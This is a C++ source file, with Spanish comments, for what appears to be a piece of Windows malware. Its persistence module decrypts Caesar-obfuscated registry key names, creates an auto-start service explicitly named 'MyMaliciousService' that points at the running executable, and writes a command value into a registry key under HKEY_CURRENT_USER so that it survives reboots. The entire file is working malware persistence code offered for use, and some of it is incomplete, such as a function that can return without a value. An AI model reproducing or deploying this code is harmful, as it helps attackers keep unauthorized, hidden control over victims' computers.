#include <windows.h>
#include <string>
#include "Persistence.h"
#include "Utils.h"

Persistence::Persistence() {
    this->keyPath_str = Utils::StringToWstring(Crypt::decryptCaesar(this->keyPath, 0xDE));
    this->driverLoaded_str = Utils::StringToWstring(Crypt::decryptCaesar(this->driverLoaded, 0xDE));

    std::wstring serviceName = L"MyMaliciousService";
    std::wstring serviceDisplayName = L"My Malicious Service";
    std::wstring servicePath = std::wstring(Executable::getCurrentPath());


    if (CreateMaliciousService(serviceName, serviceDisplayName, servicePath)) {
        std::cout << "El servicio de persistencia se ha configurado correctamente." << std::endl;
    }
    else {
        std::cerr << "No se pudo configurar el servicio de persistencia." << std::endl;
    }
}

BOOL Persistence::CreateMaliciousService(const std::wstring& serviceName, const std::wstring& serviceDisplayName, const std::wstring& servicePath) {
    // Abre el manejador de la base de datos de control de servicios
    SC_HANDLE hSCManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) {
        std::cerr << "Error al abrir el administrador de control de servicios: " << GetLastError() << std::endl;
        return FALSE;
    }

    // Crea el servicio
    SC_HANDLE hService = CreateService(
        hSCManager,
        serviceName.c_str(),             // Nombre del servicio
        serviceDisplayName.c_str(),       // Nombre que se mostrará
        SERVICE_ALL_ACCESS,               // Acceso total
        SERVICE_WIN32_OWN_PROCESS,        // Tipo de servicio
        SERVICE_AUTO_START,               // Tipo de inicio
        SERVICE_ERROR_NORMAL,             // Nivel de error
        servicePath.c_str(),              // Ruta del ejecutable
        nullptr,                          // No pertenece a un grupo de carga
        nullptr,                          // Sin dependencias
        nullptr,                          // No depende de otros servicios
        nullptr,                          // Usuario de inicio (LocalSystem)
        nullptr                           // Contraseña
    );

    if (!hService) {
        std::cerr << "Error al crear el servicio: " << GetLastError() << std::endl;
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    std::cout << "Servicio creado correctamente." << std::endl;

    // Limpieza
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    return TRUE;
}


BOOL Persistence::StartPersistence() {
    if (Persistence::IsRegistryKeyModified()) {
        return TRUE;
    }

    /*if (Persistence::CreateRegistryKey()) {
        return Persistence::RegistryKeyModification();
    }
    else {
        std::cerr << "Hubo un error al crear la llave de registro:" << std::endl;
        return FALSE;
    }*/
}

BOOL Persistence::IsRegistryKeyModified() {
    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, keyPath_str.c_str(), 0, KEY_QUERY_VALUE, &hKey);

    if (result != ERROR_SUCCESS) {
        return FALSE;
    }

    wchar_t currentValue[248];
    DWORD bufferSize = sizeof(currentValue);
    result = RegQueryValueEx(hKey, driverLoaded_str.c_str(), nullptr, nullptr, (LPBYTE)currentValue, &bufferSize);
    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        return FALSE;
    }

    // Comparar el valor esperado con el valor actual en el registro
    std::wstring expectedValue = newCommand;
    return expectedValue == currentValue;
}

BOOL Persistence::CreateRegistryKey() {
    HKEY hKey;
    LONG result = RegCreateKeyEx(HKEY_CURRENT_USER, keyPath_str.c_str(), 0, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hKey, nullptr);

    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }

    RegCloseKey(hKey);
    return FALSE;
}

BOOL Persistence::RegistryKeyModification() {
    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, keyPath_str.c_str(), 0, KEY_SET_VALUE, &hKey);

    if (result == ERROR_SUCCESS) {
        result = RegSetValueEx(hKey, driverLoaded_str.c_str(), 0, REG_SZ,
            reinterpret_cast<const BYTE*>(newCommand.c_str()),
            static_cast<DWORD>((newCommand.size() + 1) * sizeof(WCHAR)));
        RegCloseKey(hKey);
        return result == ERROR_SUCCESS;
    }

    RegCloseKey(hKey);
    return FALSE;
}
